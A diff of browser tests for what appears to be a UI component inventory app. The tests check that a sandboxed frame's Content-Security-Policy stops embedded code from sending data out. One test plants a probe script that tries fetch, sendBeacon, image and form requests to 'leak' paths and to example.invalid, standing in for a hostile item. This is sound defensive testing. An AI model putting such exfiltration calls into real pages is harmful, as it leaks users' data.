@@ -27,7 +27,7 @@ async function withDom<T>(run: () => T): Promise<T> {
 }
 import { bundleForBrowser } from "../../../packages/scanner/src/specimens/client.ts";
 import { forcedStates } from "../../../packages/scanner/src/specimens/states.ts";
-import { stateStripDocument } from "../src/screens/inventory/Specimens.tsx";
+import { frameDocument, stateStripDocument } from "../src/screens/inventory/Specimens.tsx";
 import { LIVE_SANDBOX, liveDocument } from "../src/screens/inventory/try-live.tsx";
 import type { Manifest, InventoryIndex } from "../src/data/types.ts";
 import type { TryIndex } from "../scripts/try-server.ts";
@@ -42,6 +42,8 @@ let server: Server;
 let origin: string;
 /** What the local server serves, by path. */
 const files = new Map<string, { type: string; body: string }>();
+/** Every path asked of the local server, in order. */
+const requested: string[] = [];
 
 const attribute = (text: string): string => text.replace(/&/g, "&amp;").replace(/"/g, "&quot;");
 /** A hub page holding one frame, recording the messages it gets (from that frame, by source). */
@@ -55,6 +57,7 @@ beforeAll(async () => {
   const console_ = index.projects.find((p) => p.id === "console")!;
   files.set("/light.css", { type: "text/css", body: readFileSync(join(DATA, console_.specimenCss!.light), "utf8") });
   server = createServer((req, res) => {
+    requested.push(req.url ?? "");
     const file = files.get(req.url ?? "");
     res.statusCode = file ? 200 : 404;
     res.setHeader("Content-Type", file?.type ?? "text/plain");
@@ -191,4 +194,55 @@ describe("Try it: the console's Radix Tabs live in a sandboxed frame (c2)", () =
       await page.close();
     }
   }, 60_000);
+});
+
+describe("a frame sends nothing of its own (its Content-Security-Policy)", () => {
+  test("a Discover-style bundle in a live frame runs, but its fetch, beacon, image and form go nowhere", async () => {
+    // What a hostile registry item might do once drawn: send what it read anywhere it can.
+    files.set("/probe.js", {
+      type: "text/javascript",
+      body: `(async () => {
+        const tried = [];
+        for (const url of [HUB + "/leak-fetch", "https://example.invalid/leak"]) { try { await fetch(url, { mode: "no-cors" }); tried.push("fetched " + url); } catch (e) { tried.push("blocked " + url); } }
+        try { navigator.sendBeacon(HUB + "/leak-beacon", "x"); } catch (e) {}
+        const img = new Image(); img.src = HUB + "/leak-img"; document.body.appendChild(img);
+        const form = document.createElement("form"); form.action = HUB + "/leak-form"; form.method = "post"; document.body.appendChild(form); try { form.submit(); } catch (e) {}
+        parent.postMessage({ youi: "try", type: "probe", tried }, "*");
+      })();`.replace(/HUB/g, JSON.stringify(origin)),
+    });
+    const doc = await withDom(() => liveDocument("", `${origin}/light.css`, "light", `${origin}/probe.js`));
+    expect(doc).toContain(`script-src ${origin};`);
+    expect(doc).toContain("connect-src 'none'");
+    files.set("/live-probe.html", { type: "text/html", body: hubPage(doc, LIVE_SANDBOX) });
+    const page = await browser.newPage();
+    try {
+      requested.length = 0;
+      await page.goto(`${origin}/live-probe.html`);
+      await page.waitForFunction(() => (window as unknown as { got: Array<{ type?: string }> }).got.some((m) => m.type === "probe"), null, { timeout: 15_000 });
+      await page.waitForTimeout(500);
+      const probe = (await page.evaluate(() => (window as unknown as { got: Array<{ type?: string; tried?: string[] }> }).got.find((m) => m.type === "probe")))!;
+      // The script itself loaded from the hub and ran; everything it sent was blocked.
+      expect(requested).toContain("/probe.js");
+      expect(probe.tried).toEqual([`blocked ${origin}/leak-fetch`, "blocked https://example.invalid/leak"]);
+      expect(requested.filter((path) => path.startsWith("/leak"))).toEqual([]);
+    } finally {
+      await page.close();
+    }
+  });
+
+  test("a static frame's url() in a style or an arbitrary class fetches nothing", async () => {
+    files.set("/arbitrary.css", { type: "text/css", body: `.bg-\\[url\\(leak\\)\\] { background-image: url(${origin}/leak-class); width: 40px; height: 40px; }` });
+    const doc = await withDom(() => frameDocument(`<div class="bg-[url(leak)]"></div><div style="background:url(${origin}/leak-style);width:40px;height:40px"></div><img src="${origin}/leak-img">`, `${origin}/arbitrary.css`, "light"));
+    files.set("/static-probe.html", { type: "text/html", body: hubPage(doc, "allow-same-origin") });
+    const page = await browser.newPage();
+    try {
+      requested.length = 0;
+      await page.goto(`${origin}/static-probe.html`);
+      await page.waitForTimeout(800);
+      expect(requested).toContain("/arbitrary.css");
+      expect(requested.filter((path) => path.startsWith("/leak"))).toEqual([]);
+    } finally {
+      await page.close();
+    }
+  });
 });
